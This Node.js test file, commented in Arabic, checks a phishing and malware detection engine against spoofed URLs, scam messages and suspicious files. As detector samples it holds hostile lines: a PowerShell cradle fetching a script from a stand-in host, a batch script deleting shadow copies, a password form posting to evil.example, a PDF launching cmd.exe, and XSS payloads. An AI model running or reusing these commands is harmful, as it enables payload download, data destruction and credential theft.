'use strict';
// تشغيل الاختبارات:  node --test
const test = require('node:test');
const assert = require('node:assert/strict');
const E = require('../public/js/detection-engine.js');

const url = (u, o) => E.analyzeUrl(u, o);
const bytes = (...parts) => Uint8Array.from(parts.flat());
const ascii = s => Array.from(s, c => c.charCodeAt(0));
const file = (name, head, extra = {}) => E.analyzeFile({ name, size: head.length, head, tail: extra.tail || new Uint8Array(0) });

function minimalPE({ signed = false, sections = ['.text', '.data'] } = {}) {
    const b = new Uint8Array(1024);
    const v = new DataView(b.buffer);
    b[0] = 0x4D; b[1] = 0x5A;
    v.setUint32(0x3C, 0x80, true);
    b.set(ascii('PE\0\0'), 0x80);
    v.setUint16(0x84 + 2, sections.length, true);          // NumberOfSections
    v.setUint16(0x84 + 16, 224, true);                      // SizeOfOptionalHeader
    v.setUint16(0x84 + 18, 0x0102, true);                   // Characteristics
    const opt = 0x84 + 20;
    v.setUint16(opt, 0x10B, true);                          // PE32
    v.setUint32(opt + 92, 16, true);                        // NumberOfRvaAndSizes
    if (signed) { v.setUint32(opt + 96 + 4 * 8, 0x400, true); v.setUint32(opt + 96 + 4 * 8 + 4, 0x100, true); }
    sections.forEach((name, i) => b.set(ascii(name), opt + 224 + i * 40));
    return b;
}

// ---------------------------------------------------------------- الروابط

test('روابط رسمية معروفة تطلع آمنة', () => {
    for (const u of ['https://www.facebook.com/login', 'https://accounts.google.com/signin', 'https://tu.edu.iq', 'https://ccms.tu.edu.iq/news', 'https://paypal.com/signin', 'https://www.amazon.co.uk']) {
        const r = url(u);
        assert.equal(r.level, 'safe', `${u} -> ${r.score}`);
    }
});

test('كشف الأخطاء الإملائية والأحرف المستبدلة', () => {
    for (const u of ['https://fasebook.com', 'https://g0ogle.com', 'https://paypa1.com', 'https://faceb00k.com', 'https://rnicrosoft.com', 'https://gooogle.com', 'https://instagarm.com', 'https://whatsap.com', 'https://amaz0n.com']) {
        const r = url(u);
        assert.equal(r.level, 'danger', `${u} -> ${r.score}`);
    }
});

test('كشف دمج اسم العلامة مع كلمات (Combosquatting)', () => {
    for (const u of ['https://facebook-login-secure.com', 'https://paypal-verify.net', 'https://secure-microsoft-update.xyz', 'https://rafidain-bank-secure-update.com']) {
        const r = url(u);
        assert.notEqual(r.level, 'safe', `${u} -> ${r.score}`);
    }
    assert.equal(url('https://facebook-login-secure.com').level, 'danger');
    assert.equal(url('https://paypal-verify.net').level, 'danger');
});

test('النطاق الرسمي داخل نطاق فرعي أو بعد @', () => {
    assert.equal(url('https://paypal.com.secure-login.xyz/verify').level, 'danger');
    assert.equal(url('https://login.microsoftonline.com.evil.top').level, 'danger');
    assert.equal(url('https://google.com@evil-site.ru/login').level, 'danger');
    assert.equal(url('https://facebook.verify-account.info').level, 'danger');
});

test('هجوم Homograph بأحرف كيريلية ونطاقات punycode', () => {
    assert.equal(url('https://аpple.com').level, 'danger');            // الحرف الأول كيريلي
    assert.equal(url('https://xn--pple-43d.com').level, 'danger');      // نفس النطاق بصيغة punycode
    assert.equal(url('https://paypаl.com').level, 'danger');
    assert.equal(E.punycodeDecode('pple-43d'), 'аpple');
});

test('عناوين IP عادية ومموهة', () => {
    assert.equal(url('http://185.220.101.5/verify-account').level, 'danger');
    const hex = url('http://0x7f.0.0.1/login');
    assert.ok(hex.score >= 55, `hex -> ${hex.score}`);
    const decimal = url('http://3232235777/login');
    assert.ok(decimal.score >= 55, `decimal -> ${decimal.score}`);
});

test('انتحال نطاقات عراقية', () => {
    assert.equal(url('https://tu-edu-iq.com/login').level, 'danger');
    assert.equal(url('https://tu.edu.iq.portal-login.xyz').level, 'danger');
    assert.equal(url('https://mohesr-gov-iq.net').level, 'danger');
});

test('مواقع عادية ما تنعلّم خطر بالغلط', () => {
    for (const u of ['https://github.com/torvalds/linux', 'https://en.wikipedia.org/wiki/Phishing', 'https://stackoverflow.com/questions/1', 'https://www.bbc.co.uk/news', 'https://developer.mozilla.org/en-US/docs/Web', 'https://telegraph.co.uk', 'https://example.com', 'https://www.iq.gov.iq']) {
        const r = url(u);
        assert.notEqual(r.level, 'danger', `${u} -> ${r.score}: ${r.reasons.map(x => x.text).join(' | ')}`);
    }
    assert.equal(url('https://example.com').level, 'safe');
    assert.equal(url('https://en.wikipedia.org/wiki/Phishing').level, 'safe');
});

test('http بدون تشفير، استضافة مجانية، امتدادات خطرة، اختصارات', () => {
    assert.notEqual(url('http://example.com').level, 'danger');
    assert.ok(url('https://my-site.netlify.app').score > 0);
    assert.ok(url('https://bit.ly/3abcde').reasons.some(r => /مختصر/.test(r.text)));
    assert.ok(url('https://free-download.zip').reasons.some(r => /zip/.test(r.text)));
    // ملف تنفيذي من نطاق مجهول وحده: تنبيه (ما نگدر نفرّقه عن برنامج شرعي). مع مؤشر ثاني: خطر.
    assert.equal(url('https://example.com/setup.exe').level, 'warning');
    assert.equal(url('https://evil-update.xyz/setup.exe').level, 'danger');
});

test('أسماء مثل node.js أو amazon.com في نهاية المسار ليست تنزيلاً تنفيذياً', () => {
    assert.equal(url('https://stackoverflow.com/questions/tagged/node.js').level, 'safe');
    assert.equal(url('https://example.org/go/amazon.com').level, 'safe');
    assert.equal(url('https://cdn.example.org/lib/app.js').level, 'safe');
});

test('ذكر العلامة في المسار وحده ليس خطراً، مع طلب تسجيل دخول يصير خطراً', () => {
    assert.equal(url('https://www.bbc.com/news/technology-amazon-echo').level, 'safe');
    assert.equal(url('https://techblog.example.org/reviews/google-pixel-8').level, 'safe');
    assert.equal(url('https://evil-host.top/paypal/login').level, 'danger');
});

test('منصات رسمية تستضيف محتوى الآخرين لا تُعلَّم آمنة تلقائياً', () => {
    const sites = url('https://sites.google.com/view/paypal-help-center');
    assert.notEqual(sites.level, 'safe', `sites -> ${sites.score}`);
    assert.equal(url('https://sites.google.com/view/paypal-login-verify').level, 'danger');
    assert.ok(url('https://forms.gle/abc123').reasons.some(r => /أي شخص/.test(r.text)));
    // بينما الصفحات الرسمية العادية على نفس الشركة تبقى آمنة
    assert.equal(url('https://mail.google.com/mail/u/0/').level, 'safe');
    assert.equal(url('https://www.google.com/search?q=login').level, 'safe');
});

test('اسم علامة عام (apple) مع كلمة مساعدة، وعلامات الشحن والعراق', () => {
    assert.equal(url('https://appleid-apple.com').level, 'danger');
    assert.equal(url('https://apple-id-locked.online/unlock').level, 'danger');
    assert.equal(url('https://dhl-parcel-tracking.top/pay-customs').level, 'danger');
    assert.equal(url('https://ki-card-iq.com/update').level, 'danger');
    // كلمات عادية تحتوي apple ما تنعلّم
    assert.equal(url('https://pineapple-recipes.com').level, 'safe');
    assert.equal(url('https://apple-orchard.org/visit').level, 'safe');
});

test('نطاق مقلَّد داخل نطاق فرعي، حتى لو العلامة غير معروفة', () => {
    assert.equal(url('https://www.faceb00k.com.login-help.site').level, 'danger');
    assert.equal(url('https://secure.bankofamerica.com.verify.cf').level, 'danger');
});

test('إعادة التوجيه داخل الرابط', () => {
    const r = url('https://example.com/out?url=https://paypa1-login.com/verify');
    assert.equal(r.level, 'danger');
    assert.ok(r.reasons.some(x => /يعيد توجيهك/.test(x.text)));
});

test('بروتوكولات خطيرة ومدخلات غير صالحة', () => {
    assert.equal(url('javascript:alert(1)').level, 'danger');
    assert.equal(url('data:text/html;base64,PHNjcmlwdD4=').level, 'danger');
    assert.equal(url('').error, 'empty');
    assert.equal(url('http://').error, 'invalid');
    assert.equal(url('http://exa mple.com').error, 'invalid');
    assert.equal(url('<img src=x onerror=alert(1)>').error, 'invalid');
    assert.equal(url('http://exa%20mple.com').error, 'invalid');
    assert.equal(url('http://[::1]/admin').error, undefined);      // IPv6 صحيح يبقى مقبولاً
});

test('رابط مكتوب بصيغة معطّلة hxxp وبدون بروتوكول', () => {
    const r = url('hxxps://paypa1[.]com/login');
    assert.equal(r.level, 'danger');
    assert.ok(url('fasebook.com').level === 'danger');
});

test('الوضع المشدد يخفض عتبات التحذير', () => {
    const normal = url('http://some-random-shop.com/account');
    const strict = url('http://some-random-shop.com/account', { strict: true });
    assert.ok(strict.level === 'danger' || strict.level === 'warning');
    assert.ok(['safe', 'warning'].includes(normal.level));
});

test('مسافة التعديل تحسب التبديل كتعديل واحد', () => {
    assert.equal(E.editDistance('google', 'googel'), 1);
    assert.equal(E.editDistance('paypal', 'paypa1'), 1);
    assert.equal(E.editDistance('', 'abc'), 3);
    assert.equal(E.similarity('abc', 'abc'), 1);
});

// ---------------------------------------------------------------- النصوص

test('رسائل احتيال عربية وعراقية', () => {
    const scams = [
        'عزيزي العميل تم تجميد حسابك البنكي اضغط على الرابط لتحديث بياناتك فوراً',
        'مبروك ربحت جايزة 500 دولار! دز الكود اللي وصلك حتى نحولها لك',
        'تم إيقاف بطاقتك المصرفية. سجل دخول خلال 24 ساعة وإلا سيتم حذف الحساب. رمز التحقق مطلوب',
        'مبروك تم اختيارك للعمل من المنزل براتب يومي مضمون. ادفع رسوم التسجيل 25 دولار',
        'أنا من دعم واتساب، ارسل لي رمز التحقق اللي وصلك لانه حسابك راح ينحظر',
        'عرض عمل: ربح 300$ يوميا بدون خبرة، ضاعف أموالك، تواصل عبر تليجرام ولا تخبر احد',
        'Dear customer, your account has been suspended. Verify your account immediately: http://paypa1-secure.com/login',
        'Congratulations! You won a free gift. Click here to claim your prize now, act now!'
    ];
    for (const text of scams) {
        const r = E.analyzeText(text);
        assert.equal(r.level, 'danger', `${text.slice(0, 40)}… -> ${r.score}`);
    }
});

test('رسائل عادية ما تنعلّم احتيال', () => {
    const normal = [
        'السلام عليكم، هل الاجتماع غداً الساعة العاشرة؟',
        'شكراً على المساعدة، راح أرسل لك الملف بعد المحاضرة',
        'هلا شلونك؟ اليوم المحاضرة تأجلت للأسبوع الجاي',
        'Hi, are we still meeting tomorrow at 10? I will bring the slides.',
        'تم تسليم الواجب، شكراً دكتور',
        'وصلني الكود اللي سويته، شغال تمام'
    ];
    for (const text of normal) {
        const r = E.analyzeText(text);
        assert.equal(r.level, 'safe', `${text} -> ${r.score}: ${r.reasons.map(x => x.text).join(' | ')}`);
    }
});

test('تطبيع النص العربي يتجاوز التشكيل والتطويل واختلاف الهمزات', () => {
    assert.equal(E.normalizeArabic('تَجْمِيــد'), 'تجميد');
    assert.equal(E.normalizeArabic('أإآ'), 'ااا');
    const withDiacritics = E.analyzeText('عَزِيزِي العَمِيل، تَمَّ تَجْمِيد حِسَابِك، اِضْغَط عَلَى الرَّابِط');
    assert.ok(withDiacritics.score >= 55, `diacritics -> ${withDiacritics.score}`);
    const arabicIndicDigits = E.analyzeText('سيتم إغلاق حسابك خلال ٢٤ ساعة، سجل دخول فوراً');
    assert.ok(arabicIndicDigits.score >= 55, `digits -> ${arabicIndicDigits.score}`);
});

test('الروابط داخل الرسالة تُفحص وتؤثر على النتيجة', () => {
    const r = E.analyzeText('تم تحديث السياسة، راجعها هنا: https://faceb00k-login-check.com/verify');
    assert.ok(r.urls.length === 1 && r.urls[0].level === 'danger');
    assert.equal(r.level, 'danger');
    const ok = E.analyzeText('الموقع الرسمي للجامعة https://tu.edu.iq');
    assert.equal(ok.level, 'safe');
});

test('النص الفارغ يرجع خطأ ويعطي نصائح عند الخطر', () => {
    assert.equal(E.analyzeText('   ').error, 'empty');
    const r = E.analyzeText('دز لي رمز التحقق اللي وصلك فوراً وإلا سيتم إيقاف حسابك');
    assert.ok(r.advice.length >= 1);
});

// ---------------------------------------------------------------- الملفات

test('تحديد نوع الملف من بصمته', () => {
    assert.equal(E.detectFileType(bytes(ascii('%PDF-1.7\n'))).kind, 'pdf');
    assert.equal(E.detectFileType(bytes(0xFF, 0xD8, 0xFF, 0xE0, 0, 0)).kind, 'image');
    assert.equal(E.detectFileType(bytes(0x89, 0x50, 0x4E, 0x47, 13, 10)).kind, 'image');
    assert.equal(E.detectFileType(bytes(ascii('PK\x03\x04'), new Array(20).fill(0))).kind, 'archive');
    assert.equal(E.detectFileType(bytes(0x4D, 0x5A, 0x90, 0)).kind, 'executable');
    assert.equal(E.detectFileType(bytes(ascii('hello world, plain text\n'))).kind, 'text');
    assert.equal(E.detectFileType(bytes(ascii('<!DOCTYPE html><html><body>'))).kind, 'html');
    assert.equal(E.detectFileType(bytes(ascii('#!/bin/sh\necho hi'))).kind, 'script');
});

test('مستند DOCX وملف APK وملف JAR تتميز عن ZIP العادي', () => {
    const docx = bytes(ascii('PK\x03\x04'), new Array(30).fill(0), ascii('[Content_Types].xml'), ascii('word/document.xml'));
    assert.equal(E.detectFileType(docx).kind, 'ooxml');
    const apk = bytes(ascii('PK\x03\x04'), new Array(30).fill(0), ascii('AndroidManifest.xml'));
    assert.equal(E.detectFileType(apk).kind, 'executable');
    const jar = bytes(ascii('PK\x03\x04'), new Array(30).fill(0), ascii('META-INF/MANIFEST.MF'));
    assert.equal(E.detectFileType(jar).kind, 'executable');
});

test('امتداد مزدوج وملف تنفيذي متنكر', () => {
    const exe = minimalPE();
    assert.equal(file('invoice.pdf.exe', exe).level, 'danger');
    assert.equal(file('photo.jpg', exe).level, 'danger');
    assert.equal(file('report.docx', exe).level, 'danger');
    assert.equal(file('song.mp3', exe).level, 'danger');
    assert.equal(file('annexe‮txt.exe', exe).level, 'danger');
});

test('ملفات سليمة تطلع آمنة', () => {
    assert.equal(file('doc.pdf', bytes(ascii('%PDF-1.7\n%%EOF'))).level, 'safe');
    assert.equal(file('pic.png', bytes(0x89, 0x50, 0x4E, 0x47, 13, 10, 26, 10, 0, 0, 0, 13)).level, 'safe');
    assert.equal(file('notes.txt', bytes(ascii('اشتري خبز وحليب\nمحاضرة الساعة 10'.replace(/[^\x00-\x7f]/g, 'a')))).level, 'safe');
    const docx = bytes(ascii('PK\x03\x04'), new Array(30).fill(0), ascii('[Content_Types].xml'));
    assert.equal(file('thesis.docx', docx).level, 'safe');
});

test('ملف PE: التوقيع الرقمي والتغليف', () => {
    const unsigned = file('setup.exe', minimalPE());
    const signed = file('setup.exe', minimalPE({ signed: true }));
    assert.ok(signed.score < unsigned.score, `signed ${signed.score} vs unsigned ${unsigned.score}`);
    assert.ok(signed.reasons.some(r => /توقيع/.test(r.text)));
    const packed = file('tool.exe', minimalPE({ sections: ['UPX0', 'UPX1', '.rsrc'] }));
    assert.ok(packed.reasons.some(r => /UPX0|مضغوط/.test(r.text)));
    assert.equal(E.parsePE(minimalPE({ signed: true })).signed, true);
    assert.equal(E.parsePE(bytes(ascii('not a pe file at all, just text'))), null);
});

test('سكربتات ضارة تُكشف من محتواها', () => {
    const ps = bytes(ascii('powershell -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\nIEX (New-Object Net.WebClient).DownloadString("http://x.ru/a.ps1")'));
    const r = file('update.ps1', ps);
    assert.equal(r.level, 'danger');
    assert.ok(r.reasons.length >= 3);
    const bat = bytes(ascii('@echo off\nvssadmin delete shadows /all /quiet\nschtasks /create /tn x /tr evil.exe'));
    assert.equal(file('clean.bat', bat).level, 'danger');
    const harmlessBat = bytes(ascii('@echo off\necho hello\npause'));
    const hb = file('hello.bat', harmlessBat);
    assert.notEqual(hb.level, 'safe');
});

test('صفحة HTML بنموذج تسجيل دخول ترسل لخادم خارجي', () => {
    const html = bytes(ascii('<html><body><form action="https://evil.example/steal" method="post"><input type="password" name="p"></form></body></html>'));
    const r = file('Invoice.html', html);
    assert.equal(r.level, 'danger');
    const plain = file('index.html', bytes(ascii('<html><body><h1>Hello</h1></body></html>')));
    assert.equal(plain.level, 'safe');
});

test('PDF بأوامر خطيرة وملفات Office بماكرو', () => {
    const pdf = bytes(ascii('%PDF-1.4\n1 0 obj << /OpenAction << /S /Launch /F (cmd.exe) >> /JavaScript (app.alert(1)) >> endobj'));
    assert.equal(file('offer.pdf', pdf).level, 'danger');
    const macro = bytes(ascii('PK\x03\x04'), new Array(30).fill(0), ascii('[Content_Types].xml'), ascii('word/vbaProject.bin'));
    const m = file('salary.docm', macro);
    assert.equal(m.level, 'danger');
});

test('كلمات التهديد باسم الملف وملفات الاختصار والمضغوطات', () => {
    assert.notEqual(file('office-crack.zip', bytes(ascii('PK\x03\x04'), new Array(30).fill(0))).level, 'safe');
    assert.equal(file('photos.lnk', bytes(0x4C, 0, 0, 0, 1, 0x14, 2, 0, 0, 0, 0, 0)).level, 'danger');
    assert.ok(file('movie.iso', bytes(new Array(40000).fill(0))).score > 0);
});

test('الإنتروبي', () => {
    assert.equal(E.shannonEntropy(new Uint8Array(1000)), 0);
    const random = new Uint8Array(65536).map((_, i) => (i * 2654435761) >>> 24);
    assert.ok(E.shannonEntropy(random) > 7.5);
});

test('ملف فارغ لا يسبب خطأ', () => {
    const r = E.analyzeFile({ name: 'empty.txt', size: 0, head: new Uint8Array(0), tail: new Uint8Array(0) });
    assert.ok(typeof r.score === 'number');
});

test('صورة بحمولة ملحقة بعد نهايتها: تنبيه، وإذا كانت سكربتاً فخطر، والصورة النظيفة آمنة', () => {
    const png = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 0, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82];
    const clean = file('photo.png', bytes(png));
    assert.equal(clean.level, 'safe');
    const script = file('photo.png', bytes(png, ascii('<script>alert(1)</script>' + 'A'.repeat(50))));
    assert.equal(script.level, 'danger');
    assert.ok(script.reasons.some(r => /بعد نهايتها/.test(r.text)));
    const blob = file('photo.png', bytes(png, new Array(200).fill(7)));
    assert.equal(blob.level, 'warning');
    const exe = file('photo.png', bytes(png, ascii('MZ'), new Array(100).fill(0)));
    assert.equal(exe.level, 'danger');
});
